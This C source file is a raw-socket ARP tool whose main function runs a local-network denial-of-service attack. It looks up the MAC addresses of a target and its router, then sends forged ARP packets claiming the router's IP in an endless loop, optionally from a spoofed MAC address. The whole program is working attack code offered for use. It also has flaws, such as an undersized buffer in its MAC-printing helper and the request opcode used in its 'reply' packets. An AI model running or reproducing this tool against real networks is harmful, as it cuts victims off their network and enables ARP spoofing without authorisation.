// Matthew Todd Geiger
// Basic ARP

#include <sys/socket.h>
#include <sys/ioctl.h>
#include <asm/types.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <time.h>
#include <linux/if_packet.h>
#include <linux/if_ether.h>
#include <linux/if_arp.h>
#include <arpa/inet.h>

#define HW_TYPE 1        // ARP Code for ethernet type hardware
#define MAC_LENGTH 6     // MAC address length in bytes
#define IPV4_LENGTH 4    // IP address length in bytes
#define ARP_REQUEST 0x01 // ARP request opcode

#define debug(x...) \
    printf(x);      \
    printf("\n");
#define info(x...) \
    printf(x);     \
    printf("\n");
#define warn(x...) \
    printf(x);     \
    printf("\n");
#define err(x...) \
    perror(x);    \
    fprintf(stderr, "\n");

// ARP protocol structure
struct arp_header
{
    unsigned short hardware_type; // ethernet, radio, etc..
    unsigned short protocol_type; // ip..
    unsigned char hardware_len;   // MAC length
    unsigned char protocol_len;   // ip length
    unsigned short opcode;        // ARP opcode can be a reply or request ARP packet
    unsigned char sender_mac[MAC_LENGTH];
    unsigned char sender_ip[IPV4_LENGTH];
    unsigned char target_mac[MAC_LENGTH];
    unsigned char target_ip[IPV4_LENGTH];
};

int get_if_ipv4(const char *ifname, int *ifindex, char *mac, uint32_t *ip, int sockfd)
{
    int ret = -1;

    // Create variable for interface mac and index number
    char *if_mac = mac;
    int if_index;
    struct ifreq ifr;

    // Copy argument in ifr for ioctl request
    strcpy(ifr.ifr_name, ifname);

    // Request socket for index number of interface name argument
    if (ioctl(sockfd, SIOCGIFINDEX, &ifr) == -1)
    {
        err("Failed to get interface index value");
        goto out;
    }

    // Save index number
    if_index = ifr.ifr_ifindex;

    // Request socket for mac address
    if (ioctl(sockfd, SIOCGIFHWADDR, &ifr) == -1)
    {
        err("Failed to get interface MAC address");
        goto out;
    }

    // Save mac address
    memcpy(if_mac, ifr.ifr_hwaddr.sa_data, MAC_LENGTH);

    // Request socket for ipv4 address
    if (ioctl(sockfd, SIOCGIFADDR, &ifr) == -1)
    {
        err("Failed to get ip address");
        goto out;
    }

    // Create variables and structs to help with saving and translating
    // ipv4 address for terminal output
    struct sockaddr_in *sin_ptr;
    sin_ptr = (struct sockaddr_in *)&ifr.ifr_addr; // Point to ipv4 address value
    *ip = sin_ptr->sin_addr.s_addr;

    *ifindex = if_index;

    ret = 0;
out:
    return ret;
}

int bind_af_packet(int sockfd, int if_index, struct sockaddr_ll *sll)
{
    int ret = -1;

    memset(sll, 0, sizeof(struct sockaddr_ll)); // Set to 0
    sll->sll_family = AF_PACKET;                // AF_PACKET socket type
    sll->sll_ifindex = if_index;                // Index number

    // Bind socket info with sll info
    if (bind(sockfd, (struct sockaddr *)sll, sizeof(*sll)) < 0)
    {
        err("Failed to bind socket information");
        goto out;
    }

    ret = 0;

out:
    return ret;
}

void create_arp_req_packet(char *packet_out, char *if_mac, uint32_t target_ip, uint32_t ip, struct sockaddr_ll *sll)
{
    // Create header pointers for output packet
    struct ethhdr *eth = (struct ethhdr *)packet_out;
    struct arp_header *arp = (struct arp_header *)(packet_out + sizeof(struct ethhdr));

    // Set ethernet header parameters
    memset(eth->h_dest, 0xff, MAC_LENGTH);     // Destination mac set to all 0xff, all 0xff mac will broadcast to all machines
    memcpy(eth->h_source, if_mac, MAC_LENGTH); // Source mac from interface
    eth->h_proto = htons(ETH_P_ARP);           // Follow arp protocol

    // Set ARP header parameters
    arp->hardware_len = MAC_LENGTH;                  // Assign MAC length
    arp->hardware_type = htons(HW_TYPE);             // Hardware type of 1. value 1 is ethernet hardware type
    arp->opcode = htons(ARP_REQUEST);                // Assign opcode arp request
    arp->protocol_len = IPV4_LENGTH;                 // Assign IPv4 length
    arp->protocol_type = htons(ETH_P_IP);            // Set protocol type to IP
    memcpy(arp->sender_ip, &ip, IPV4_LENGTH);        // Apply your IP address
    memcpy(arp->sender_mac, if_mac, MAC_LENGTH);     // Apply your MAC address
    memset(arp->target_mac, 0xff, MAC_LENGTH);       // Destination mac set to all 0xff for broadcast
    memcpy(arp->target_ip, &target_ip, IPV4_LENGTH); // Copy ip address

    // Reuse sll for sockaddr info for sendto() function
    memcpy(&sll->sll_addr, if_mac, MAC_LENGTH);
    sll->sll_halen = MAC_LENGTH;           // Set mac length
    sll->sll_hatype = htons(ARPHRD_ETHER); // Define ethernet hardware type
    sll->sll_pkttype = (PACKET_BROADCAST); // Broadcast packet
    sll->sll_protocol = htons(ETH_P_ARP);  // ARP protocol
}

void create_arp_rep_packet(char *packet_out, char *src_mac, char *dst_mac, uint32_t target_ip, uint32_t src_ip, struct sockaddr_ll *sll)
{
    // Create header pointers for output packet
    struct ethhdr *eth = (struct ethhdr *)packet_out;
    struct arp_header *arp = (struct arp_header *)(packet_out + sizeof(struct ethhdr));

    // Set ethernet header parameters
    memcpy(eth->h_dest, dst_mac, MAC_LENGTH);     // Destination mac set to all 0xff, all 0xff mac will broadcast to all machines
    memcpy(eth->h_source, src_mac, MAC_LENGTH); // Source mac from interface
    eth->h_proto = htons(ETH_P_ARP);           // Follow arp protocol

    // Set ARP header parameters
    arp->hardware_len = MAC_LENGTH;                  // Assign MAC length
    arp->hardware_type = htons(HW_TYPE);             // Hardware type of 1. value 1 is ethernet hardware type
    arp->opcode = htons(ARP_REQUEST);                // Assign opcode arp request
    arp->protocol_len = IPV4_LENGTH;                 // Assign IPv4 length
    arp->protocol_type = htons(ETH_P_IP);            // Set protocol type to IP
    memcpy(arp->sender_ip, &src_ip, IPV4_LENGTH);        // Apply your IP address
    memcpy(arp->sender_mac, src_mac, MAC_LENGTH);     // Apply your MAC address
    memcpy(arp->target_mac, dst_mac, MAC_LENGTH);       // Destination mac set to all 0xff for broadcast
    memcpy(arp->target_ip, &target_ip, IPV4_LENGTH); // Copy ip address

    // Reuse sll for sockaddr info for sendto() function
    memcpy(&sll->sll_addr, src_mac, MAC_LENGTH);
    sll->sll_halen = MAC_LENGTH;           // Set mac length
    sll->sll_hatype = htons(ARPHRD_ETHER); // Define ethernet hardware type
    sll->sll_pkttype = (PACKET_BROADCAST); // Broadcast packet
    sll->sll_protocol = htons(ETH_P_ARP);  // ARP protocol
}

int send_packet(int sockfd, char *packet_out, struct sockaddr_ll sll)
{
    // Use sendto() to send packet to network
    if (sendto(sockfd, packet_out, 64, 0, (struct sockaddr *)&sll, sizeof(sll)) < 0)
    {
        err("Failed to send packet");
        return -1;
    }

    return 0;
}

int recv_packet(int sockfd, char *packet_in, struct sockaddr_ll sll)
{
    // Recieve incoming ARP reply
    socklen_t len = sizeof(sll);
    if (recvfrom(sockfd, packet_in, 64, 0, (struct sockaddr *)&sll, &len) < 0)
    {
        err("Failed to recieve packet");
        return -1;
    }

    return 0;
}

int exec_arp_com(int sockfd, char *packet_in, char *packet_out, struct sockaddr_ll sll)
{
    int ret = -1;
    // Use sendto() to send packet to network
    if (send_packet(sockfd, packet_out, sll) != 0)
    {
        err("Failed to send packet");
        goto out;
    }

    // Recieve incoming ARP reply
    socklen_t len = sizeof(sll);
    if (recv_packet(sockfd, packet_in, sll) != 0)
    {
        err("Failed to recieve packet");
        goto out;
    }

    ret = 0;

out:
    return ret;
}

int exec_arp_com_nrep(int sockfd, char *packet_out, struct sockaddr_ll sll)
{
    int ret = -1;
    // Use sendto() to send packet to network
    if (send_packet(sockfd, packet_out, sll) != 0)
    {
        err("Failed to send packet");
        goto out;
    }

    ret = 0;

out:
    return ret;
}

char __mac_t_temp[MAC_LENGTH];
char *display_mac(char *mac)
{
    sprintf(__mac_t_temp, "%02X:%02X:%02X:%02X:%02X:%02X",
          mac[0] & 0xff,
          mac[1] & 0xff,
          mac[2] & 0xff,
          mac[3] & 0xff,
          mac[4] & 0xff,
          mac[5] & 0xff);

    return __mac_t_temp;
}

void debug_arp(char *packet_in, char *if_mac, uint32_t ip, uint32_t target_ip)
{
    struct in_addr *in = (struct in_addr *)&ip;         // Use in_addr struct for use in inet_ntoa function
    struct in_addr *in2 = (struct in_addr *)&target_ip; // Use in_addr struct for use in inet_ntoa function

    // Reuse header pointers to discect recieved packet
    struct arp_header *arp = (struct arp_header *)(packet_in + sizeof(struct ethhdr));

    debug("ARP Communication successful!");

    debug("Interface Information");
    debug("Interface MAC: %s", display_mac(if_mac));

    debug("Interface IP: %s", inet_ntoa(*in));

    // Display recieved MAC address
    debug("Target Information");
    debug("Target MAC: %s", display_mac((char *)arp->sender_mac));

    debug("Target IP: %s", inet_ntoa(*in2));
}

int create_af_sock(int proto)
{
    int sockfd = socket(AF_PACKET, SOCK_RAW, htons(proto));
    if (sockfd < 0)
    {
        err("Failed to open socket");
    }

    return sockfd;
}

void arp_rep_mac(char *return_mac, char *packet_in)
{
    struct arp_header *arp = (struct arp_header *)(packet_in + sizeof(struct ethhdr));
    memcpy(return_mac, arp->sender_mac, MAC_LENGTH);
}

int find_mac_ipv4(char *return_mac, const char *interface, const char *target_ip)
{
    int ret = -1;

    // Translate target ip to raw data
    uint32_t ip_temp = inet_addr(target_ip);

    // Create variables and structs to help with saving and translating
    // ipv4 address for terminal output
    uint32_t ip;

    // Create packet recieved and delivered buffers
    char packet_out[64];
    char packet_in[64];

    // Create variable for interface mac and index number
    char if_mac[8];
    int if_index;

    // Create raw socket for arp
    int sockfd = create_af_sock(ETH_P_ARP);
    if (sockfd < 0)
    {
        err("Failed to create af socket");
        goto out;
    }

    if (get_if_ipv4(interface, &if_index, if_mac, &ip, sockfd) != 0)
    {
        err("Failed to get hardware information\n");
        goto out;
    }

    struct sockaddr_ll sll;
    if (bind_af_packet(sockfd, if_index, &sll) != 0)
    {
        err("Failed to bind socket information\n");
        goto out;
    }

    create_arp_req_packet(packet_out, if_mac, ip_temp, ip, &sll);

    if (exec_arp_com(sockfd, packet_in, packet_out, sll) != 0)
    {
        err("Failed to transcieve arp over the network\n");
        goto out;
    }

    arp_rep_mac(return_mac, packet_in);

    debug_arp(packet_in, if_mac, ip, ip_temp);

    ret = 0;

    // Clean up
out:
    if (sockfd > -1)
        close(sockfd);

    return ret;
}

int dos_local_target(char *spoof_mac, char *router_mac, const char *interface, const char *target_ip, const char *router_ip, int delay, int spoof) {
    int ret = -1;

    srand((unsigned int)time(0));

    // Translate target ip to raw data
    uint32_t router_ip_temp = inet_addr(router_ip);
    uint32_t target_ip_temp = inet_addr(target_ip);

    // Create variables and structs to help with saving and translating
    // ipv4 address for terminal output
    uint32_t ip;

    // Create packet recieved and delivered buffers
    char packet_out[64];

    // Create variable for interface mac and index number
    char if_mac[8];
    int if_index;

    // Create raw socket for arp
    int sockfd = create_af_sock(ETH_P_ARP);
    if (sockfd < 0)
    {
        err("Failed to create af socket");
        goto out;
    }

    if (get_if_ipv4(interface, &if_index, if_mac, &ip, sockfd) != 0)
    {
        err("Failed to get hardware information\n");
        goto out;
    }

    struct sockaddr_ll sll;
    if (bind_af_packet(sockfd, if_index, &sll) != 0)
    {
        err("Failed to bind socket information\n");
        goto out;
    }

    if(spoof == 1)
        create_arp_rep_packet(packet_out, spoof_mac, router_mac, router_ip_temp, target_ip_temp, &sll);
    else
        create_arp_rep_packet(packet_out, if_mac, router_mac, router_ip_temp, target_ip_temp, &sll);

    while(1) {
        if (exec_arp_com_nrep(sockfd, packet_out, sll) != 0)
        {
            err("Failed to transcieve arp over the network\n");
            goto out;
        }

        debug("Packet Sent");

        sleep(delay);
    }

    ret = 0;

    // Clean up
out:
    if (sockfd > -1)
        close(sockfd);

    return ret;
}

int run_local_dos_attack(const char *interface, const char *target_ip, const char *router_ip, const char *spoof_ip, int spoof) {
    int ret = -1;

    char target_mac[MAC_LENGTH];
    char router_mac[MAC_LENGTH];
    char spoof_mac[MAC_LENGTH];

    if (find_mac_ipv4(target_mac, interface, target_ip) != 0)
    {
        err("Failed to find target mac address");
        goto out;
    }

    if (find_mac_ipv4(router_mac, interface, router_ip) != 0)
    {
        err("Failed to find target mac address");
        goto out;
    }

    if(spoof == 1) {
        if (find_mac_ipv4(spoof_mac, interface, spoof_ip) != 0)
        {
            err("Failed to find target mac address");
            goto out;
        }
    }

    if(dos_local_target(spoof_mac, router_mac, interface, target_ip, router_ip, 1, spoof) != 0) {
        err("Failed to dos target");
        goto out;
    }

    ret = 0;

out:
    return ret;
}

int main(const int argc, const char *argv[])
{
    int ret = -1;
    int macspoof = 1;

    if(argc < 4) {
        err("Usage: %s <INTERFACE> <TARGET_IP> <ROUTER_IP> opt:<IP_TO_SPOOF_FROM>");
        goto out;
    }

    if(argc == 4)
        macspoof = 0;

    const char *interface = argv[1];
    const char *target_ip = argv[2];
    const char *router_ip = argv[3];
    const char *spoof_ip;

    if(macspoof == 1) {
        if(!argv[4][0]) {
            err("Please enter MAC address");
            goto out;
        }

        spoof_ip = argv[4];
    }
    else {
        debug("Not spoofing mac address");
        spoof_ip = NULL;
    }

    if(run_local_dos_attack(interface, target_ip, router_ip, spoof_ip, macspoof) != 0) {
        err("DOS FAILED");
        goto out;
    }

    ret = 0;

out:
    return ret;
}
